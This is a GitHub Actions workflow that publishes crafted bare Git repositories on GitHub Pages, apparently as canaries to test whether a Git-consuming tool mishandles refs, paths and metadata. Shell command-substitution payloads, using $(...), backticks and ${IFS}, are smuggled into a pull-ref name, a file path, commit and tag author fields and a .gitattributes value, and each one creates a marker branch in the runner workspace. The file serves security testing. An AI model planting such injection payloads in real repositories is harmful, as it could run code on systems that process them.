name: GSM dumb HTTP Git baseline

on:
  workflow_dispatch:

permissions: {}

concurrency:
  group: gsm-dumb-http-git
  cancel-in-progress: false

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    permissions:
      contents: read
    steps:
      - name: Build an inert bare repository and Pages artifact
        shell: bash
        env:
          ARTIFACT_PATH: ${{ runner.temp }}/artifact.tar
          WORK_REPOSITORY: ${{ runner.temp }}/gsm-work
          SITE_ROOT: ${{ runner.temp }}/site
        run: |
          set -euo pipefail

          git init --initial-branch=main "$WORK_REPOSITORY"
          git -C "$WORK_REPOSITORY" config user.name "GSM canary"
          git -C "$WORK_REPOSITORY" config user.email "gsm-canary@example.invalid"
          printf '%s\n' 'GSM_DUMB_HTTP_BASELINE_20260909' > "$WORK_REPOSITORY/marker.txt"
          git -C "$WORK_REPOSITORY" add marker.txt
          git -C "$WORK_REPOSITORY" commit -m 'Add inert GSM parser marker'

          mkdir -p "$SITE_ROOT/site"
          printf '%s\n' 'GitHub Pages GSM dumb HTTP baseline' > "$SITE_ROOT/site/index.html"
          git clone --bare "$WORK_REPOSITORY" "$SITE_ROOT/site/dumb-git"
          git --git-dir="$SITE_ROOT/site/dumb-git" repack -ad
          git --git-dir="$SITE_ROOT/site/dumb-git" update-server-info

          git init --initial-branch=main "$WORK_REPOSITORY-lfs"
          git -C "$WORK_REPOSITORY-lfs" config user.name "GSM canary"
          git -C "$WORK_REPOSITORY-lfs" config user.email "gsm-canary@example.invalid"
          printf '%s\n' '*.bin filter=lfs diff=lfs merge=lfs -text' > "$WORK_REPOSITORY-lfs/.gitattributes"
          cat > "$WORK_REPOSITORY-lfs/.lfsconfig" <<'EOF'
          [lfs]
            url = https://singetu0096.github.io/pages-static-canary-20260909/site/lfs-probe
          EOF
          cat > "$WORK_REPOSITORY-lfs/probe.bin" <<'EOF'
          version https://git-lfs.github.com/spec/v1
          oid sha256:efd28e97fbe142528b8dc64764645f76be50721c20d254c36b6badbf47a5a43e
          size 29
          EOF
          printf '%s\n' 'GSM_LFS_DISCOVERY_PROBE_20260909' > "$WORK_REPOSITORY-lfs/marker.txt"
          git -C "$WORK_REPOSITORY-lfs" add .gitattributes .lfsconfig probe.bin marker.txt
          git -C "$WORK_REPOSITORY-lfs" commit -m 'Add inert LFS discovery probe'
          git clone --bare "$WORK_REPOSITORY-lfs" "$SITE_ROOT/site/dumb-lfs-probe"
          git --git-dir="$SITE_ROOT/site/dumb-lfs-probe" repack -ad
          git --git-dir="$SITE_ROOT/site/dumb-lfs-probe" update-server-info

          malformed_repository="$SITE_ROOT/site/dumb-malformed-commit"
          git init --bare "$malformed_repository"
          empty_tree=$(printf '' | git --git-dir="$malformed_repository" hash-object -t tree -w --stdin)
          malformed_commit=$(
            printf 'tree %s\ncommitter GSM canary <gsm-canary@example.invalid> 0 +0000\n\nGSM_MISSING_AUTHOR_PROBE_20260909\n' "$empty_tree" |
              git --git-dir="$malformed_repository" hash-object --literally -t commit -w --stdin
          )
          git --git-dir="$malformed_repository" update-ref refs/heads/main "$malformed_commit"
          git --git-dir="$malformed_repository" symbolic-ref HEAD refs/heads/main
          git --git-dir="$malformed_repository" repack -ad
          git --git-dir="$malformed_repository" update-server-info

          git init --initial-branch=main "$WORK_REPOSITORY-broken-ref"
          git -C "$WORK_REPOSITORY-broken-ref" config user.name "GSM canary"
          git -C "$WORK_REPOSITORY-broken-ref" config user.email "gsm-canary@example.invalid"
          printf '%s\n' 'GSM_BROKEN_REF_BASELINE_20260909' > "$WORK_REPOSITORY-broken-ref/marker.txt"
          git -C "$WORK_REPOSITORY-broken-ref" add marker.txt
          git -C "$WORK_REPOSITORY-broken-ref" commit -m 'Add broken-ref baseline marker'
          git clone --bare "$WORK_REPOSITORY-broken-ref" "$SITE_ROOT/site/dumb-broken-ref"
          broken_blob=$(printf '%s\n' 'GSM_BLOB_AS_BRANCH_20260909' | git --git-dir="$SITE_ROOT/site/dumb-broken-ref" hash-object -t blob -w --stdin)
          printf '%s\n' "$broken_blob" > "$SITE_ROOT/site/dumb-broken-ref/refs/heads/broken-blob"
          git --git-dir="$SITE_ROOT/site/dumb-broken-ref" repack -ad
          git --git-dir="$SITE_ROOT/site/dumb-broken-ref" update-server-info

          git init --initial-branch=main "$WORK_REPOSITORY-pull-ref"
          git -C "$WORK_REPOSITORY-pull-ref" config user.name "GSM canary"
          git -C "$WORK_REPOSITORY-pull-ref" config user.email "gsm-canary@example.invalid"
          printf '%s\n' 'GSM_PULL_REF_BASELINE_20260909' > "$WORK_REPOSITORY-pull-ref/marker.txt"
          git -C "$WORK_REPOSITORY-pull-ref" add marker.txt
          git -C "$WORK_REPOSITORY-pull-ref" commit -m 'Add pull-ref cleanup baseline marker'
          git clone --bare "$WORK_REPOSITORY-pull-ref" "$SITE_ROOT/site/dumb-pull-ref"
          pull_ref_commit=$(git --git-dir="$SITE_ROOT/site/dumb-pull-ref" rev-parse refs/heads/main)
          git --git-dir="$SITE_ROOT/site/dumb-pull-ref" update-ref refs/pull/123/head "$pull_ref_commit"
          git --git-dir="$SITE_ROOT/site/dumb-pull-ref" repack -ad
          git --git-dir="$SITE_ROOT/site/dumb-pull-ref" update-server-info

          git init --initial-branch=main "$WORK_REPOSITORY-ref-shell"
          git -C "$WORK_REPOSITORY-ref-shell" config user.name "GSM canary"
          git -C "$WORK_REPOSITORY-ref-shell" config user.email "gsm-canary@example.invalid"
          printf '%s\n' 'GSM_REFNAME_SHELL_CANARY_SOURCE_20260909' > "$WORK_REPOSITORY-ref-shell/marker.txt"
          git -C "$WORK_REPOSITORY-ref-shell" add marker.txt
          git -C "$WORK_REPOSITORY-ref-shell" commit -m 'Add inert refname shell canary source marker'
          git clone --bare "$WORK_REPOSITORY-ref-shell" "$SITE_ROOT/site/dumb-pull-ref-shell-canary"
          shell_canary_commit=$(git --git-dir="$SITE_ROOT/site/dumb-pull-ref-shell-canary" rev-parse refs/heads/main)
          shell_canary_ref='refs/pull/125/$(git${IFS}--git-dir=${GITHUB_WORKSPACE}/git-data/source.git${IFS}update-ref${IFS}refs/heads/GSM_RCE_MARKER_20260909${IFS}'"$shell_canary_commit"')'
          git check-ref-format "$shell_canary_ref"
          git --git-dir="$SITE_ROOT/site/dumb-pull-ref-shell-canary" update-ref "$shell_canary_ref" "$shell_canary_commit"
          git --git-dir="$SITE_ROOT/site/dumb-pull-ref-shell-canary" repack -ad
          git --git-dir="$SITE_ROOT/site/dumb-pull-ref-shell-canary" update-server-info

          tree_path_repository="$SITE_ROOT/site/dumb-tree-path-canary"
          git init --bare "$tree_path_repository"
          tree_path_baseline_blob=$(printf '%s\n' 'GSM_TREE_PATH_BASELINE_20260909' | git --git-dir="$tree_path_repository" hash-object -w --stdin)
          tree_path_baseline_tree=$(
            OID="$tree_path_baseline_blob" NAME='marker.txt' \
              perl -e 'print "100644 blob $ENV{OID}\t$ENV{NAME}\0"' |
              git --git-dir="$tree_path_repository" mktree -z
          )
          tree_path_baseline_commit=$(
            printf '%s\n' 'GSM tree path baseline' |
              GIT_AUTHOR_NAME='GSM canary' \
              GIT_AUTHOR_EMAIL='gsm-canary@example.invalid' \
              GIT_COMMITTER_NAME='GSM canary' \
              GIT_COMMITTER_EMAIL='gsm-canary@example.invalid' \
              git --git-dir="$tree_path_repository" commit-tree "$tree_path_baseline_tree"
          )

          tree_shell_canary_path='$(git${IFS}--git-dir=${GITHUB_WORKSPACE}${PWD:0:1}git-data${PWD:0:1}source.git${IFS}update-ref${IFS}refs${PWD:0:1}heads${PWD:0:1}GSM_TREE_RCE_MARKER_20260909${IFS}'"$tree_path_baseline_commit"')'
          case "$tree_shell_canary_path" in
            */*) printf '%s\n' 'tree shell canary unexpectedly contains a slash' >&2; exit 1 ;;
          esac
          test "${#tree_shell_canary_path}" -le 240

          tree_shell_canary_blob=$(printf '%s\n' 'GSM_TREE_SHELL_CANARY_FILE_20260909' | git --git-dir="$tree_path_repository" hash-object -w --stdin)
          tree_newline_blob=$(printf '%s\n' 'GSM_TREE_NEWLINE_PATH_20260909' | git --git-dir="$tree_path_repository" hash-object -w --stdin)
          tree_tab_blob=$(printf '%s\n' 'GSM_TREE_TAB_PATH_20260909' | git --git-dir="$tree_path_repository" hash-object -w --stdin)
          tree_path_root=$(
            CANARY_OID="$tree_shell_canary_blob" \
              CANARY_NAME="$tree_shell_canary_path" \
              MARKER_OID="$tree_path_baseline_blob" \
              NEWLINE_OID="$tree_newline_blob" \
              TAB_OID="$tree_tab_blob" \
              perl -e 'print "100644 blob $ENV{CANARY_OID}\t$ENV{CANARY_NAME}\0"; print "100644 blob $ENV{NEWLINE_OID}\tline\nbreak.txt\0"; print "100644 blob $ENV{MARKER_OID}\tmarker.txt\0"; print "100644 blob $ENV{TAB_OID}\ttab\tbreak.txt\0"' |
              git --git-dir="$tree_path_repository" mktree -z
          )
          tree_path_main_commit=$(
            printf '%s\n' 'GSM tree path parser canary' |
              GIT_AUTHOR_NAME='GSM canary' \
              GIT_AUTHOR_EMAIL='gsm-canary@example.invalid' \
              GIT_COMMITTER_NAME='GSM canary' \
              GIT_COMMITTER_EMAIL='gsm-canary@example.invalid' \
              git --git-dir="$tree_path_repository" commit-tree -p "$tree_path_baseline_commit" "$tree_path_root"
          )
          git --git-dir="$tree_path_repository" update-ref refs/heads/main "$tree_path_main_commit"
          git --git-dir="$tree_path_repository" symbolic-ref HEAD refs/heads/main
          git --git-dir="$tree_path_repository" repack -ad
          git --git-dir="$tree_path_repository" update-server-info

          metadata_repository="$SITE_ROOT/site/dumb-metadata-canary"
          git init --bare "$metadata_repository"
          metadata_tree=$(printf '' | git --git-dir="$metadata_repository" hash-object -t tree -w --stdin)
          metadata_baseline_commit=$(
            printf '%s\n' 'GSM metadata baseline' |
              GIT_AUTHOR_NAME='GSM canary' \
              GIT_AUTHOR_EMAIL='gsm-canary@example.invalid' \
              GIT_AUTHOR_DATE='2000-01-01T00:00:00+0000' \
              GIT_COMMITTER_NAME='GSM canary' \
              GIT_COMMITTER_EMAIL='gsm-canary@example.invalid' \
              GIT_COMMITTER_DATE='2000-01-01T00:00:00+0000' \
              git --git-dir="$metadata_repository" commit-tree "$metadata_tree"
          )
          metadata_shell_command='git${IFS}--git-dir=${GITHUB_WORKSPACE}/git-data/source.git${IFS}update-ref${IFS}refs/heads/GSM_META_RCE_MARKER_20260909${IFS}'"$metadata_baseline_commit"
          metadata_dollar_canary='$('"$metadata_shell_command"')'
          metadata_backtick_canary='`'"$metadata_shell_command"'`'
          metadata_commit=$(
            TREE="$metadata_tree" \
              PARENT="$metadata_baseline_commit" \
              DOLLAR_CANARY="$metadata_dollar_canary" \
              BACKTICK_CANARY="$metadata_backtick_canary" \
              perl -e '
                print "tree $ENV{TREE}\n";
                print "parent $ENV{PARENT}\n";
                print "author GSM $ENV{DOLLAR_CANARY} <gsm-$ENV{DOLLAR_CANARY}\@example.invalid> 0 +0000\n";
                print "committer GSM $ENV{BACKTICK_CANARY} <gsm-$ENV{BACKTICK_CANARY}\@example.invalid> 0 +0000\n";
                print "encoding UTF-8\n\n";
                print "GSM metadata parser canary\n";
                print "$ENV{DOLLAR_CANARY}\n";
                print "single-quote breaker: '\'';$ENV{DOLLAR_CANARY};#\n";
                print qq{double-quote breaker: \"$ENV{DOLLAR_CANARY}\"\n};
                print "$ENV{BACKTICK_CANARY}\n";
              ' |
              git --git-dir="$metadata_repository" hash-object --literally -t commit -w --stdin
          )
          metadata_tag=$(
            OBJECT="$metadata_commit" \
              DOLLAR_CANARY="$metadata_dollar_canary" \
              BACKTICK_CANARY="$metadata_backtick_canary" \
              perl -e '
                print "object $ENV{OBJECT}\n";
                print "type commit\n";
                print "tag gsm-metadata-canary\n";
                print "tagger GSM $ENV{DOLLAR_CANARY} <gsm-$ENV{DOLLAR_CANARY}\@example.invalid> 0 +0000\n\n";
                print "GSM annotated tag metadata canary\n";
                print "$ENV{DOLLAR_CANARY}\n$ENV{BACKTICK_CANARY}\n";
              ' |
              git --git-dir="$metadata_repository" hash-object --literally -t tag -w --stdin
          )
          git --git-dir="$metadata_repository" update-ref refs/heads/main "$metadata_commit"
          git --git-dir="$metadata_repository" update-ref refs/tags/gsm-metadata-canary "$metadata_tag"
          git --git-dir="$metadata_repository" symbolic-ref HEAD refs/heads/main
          git --git-dir="$metadata_repository" fsck --strict
          test -z "$(git --git-dir="$metadata_repository" for-each-ref --format='%(refname)' refs/heads/GSM_META_RCE_MARKER_20260909)"
          git --git-dir="$metadata_repository" repack -ad
          git --git-dir="$metadata_repository" update-server-info

          large_path_repository="$SITE_ROOT/site/dumb-large-path-canary"
          git init --bare "$large_path_repository"
          large_baseline_blob=$(printf '%s\n' 'GSM_LARGE_PATH_BASELINE_20260909' | git --git-dir="$large_path_repository" hash-object -w --stdin)
          large_baseline_tree=$(
            OID="$large_baseline_blob" NAME='marker.txt' \
              perl -e 'print "100644 blob $ENV{OID}\t$ENV{NAME}\0"' |
              git --git-dir="$large_path_repository" mktree -z
          )
          large_baseline_commit=$(
            printf '%s\n' 'GSM large-path baseline' |
              GIT_AUTHOR_NAME='GSM canary' \
              GIT_AUTHOR_EMAIL='gsm-canary@example.invalid' \
              GIT_COMMITTER_NAME='GSM canary' \
              GIT_COMMITTER_EMAIL='gsm-canary@example.invalid' \
              git --git-dir="$large_path_repository" commit-tree "$large_baseline_tree"
          )

          large_path_command='cd${IFS}git-data;git${IFS}--git-dir=source.git${IFS}branch${IFS}-f${IFS}GSM_LARGE_PATH_RCE_MARKER_20260909${IFS}'"$large_baseline_commit"
          large_path_canary='$('"$large_path_command"')'
          large_canary_path="large.${large_path_canary}.bin"
          case "$large_canary_path" in
            */*) printf '%s\n' 'large-path canary unexpectedly contains a slash' >&2; exit 1 ;;
          esac
          test "${#large_canary_path}" -le 240

          large_attr_command='cd${IFS}git-data;git${IFS}--git-dir=source.git${IFS}branch${IFS}-f${IFS}GSM_LARGE_ATTR_RCE_MARKER_20260909${IFS}'"$large_baseline_commit"
          large_attr_canary='$('"$large_attr_command"')'
          large_attributes_blob=$(
            printf 'large.* -text gsmprobe=%s\n' "$large_attr_canary" |
              git --git-dir="$large_path_repository" hash-object -w --stdin
          )
          large_blob=$(
            head -c $((101 * 1024 * 1024)) /dev/zero |
              git --git-dir="$large_path_repository" hash-object -w --stdin
          )
          large_root_tree=$(
            ATTR_OID="$large_attributes_blob" \
              LARGE_OID="$large_blob" \
              LARGE_NAME="$large_canary_path" \
              MARKER_OID="$large_baseline_blob" \
              perl -e 'print "100644 blob $ENV{ATTR_OID}\t.gitattributes\0"; print "100644 blob $ENV{LARGE_OID}\t$ENV{LARGE_NAME}\0"; print "100644 blob $ENV{MARKER_OID}\tmarker.txt\0"' |
              git --git-dir="$large_path_repository" mktree -z
          )
          large_main_commit=$(
            printf '%s\n' 'GSM large-path and attribute parser canary' |
              GIT_AUTHOR_NAME='GSM canary' \
              GIT_AUTHOR_EMAIL='gsm-canary@example.invalid' \
              GIT_COMMITTER_NAME='GSM canary' \
              GIT_COMMITTER_EMAIL='gsm-canary@example.invalid' \
              git --git-dir="$large_path_repository" commit-tree -p "$large_baseline_commit" "$large_root_tree"
          )
          git --git-dir="$large_path_repository" update-ref refs/heads/control "$large_baseline_commit"
          git --git-dir="$large_path_repository" update-ref refs/heads/main "$large_main_commit"
          git --git-dir="$large_path_repository" symbolic-ref HEAD refs/heads/main
          git --git-dir="$large_path_repository" fsck --strict
          test -z "$(git --git-dir="$large_path_repository" for-each-ref --format='%(refname)' refs/heads/GSM_LARGE_PATH_RCE_MARKER_20260909 refs/heads/GSM_LARGE_ATTR_RCE_MARKER_20260909)"
          git --git-dir="$large_path_repository" repack -ad
          git --git-dir="$large_path_repository" update-server-info

          tar -C "$SITE_ROOT" -cf "$ARTIFACT_PATH" site

      - name: Upload Pages artifact
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
        with:
          name: github-pages
          path: ${{ runner.temp }}/artifact.tar
          retention-days: 1
          if-no-files-found: error

  deploy:
    needs: build
    runs-on: ubuntu-latest
    timeout-minutes: 12
    environment:
      name: github-pages
      url: ${{ steps.deployment.outputs.page_url }}
    permissions:
      pages: write
      id-token: write
    steps:
      - name: Deploy Pages artifact
        id: deployment
        uses: actions/deploy-pages@368f82528645a54fb793d4d04e342629a3f51346 # v5.0.1
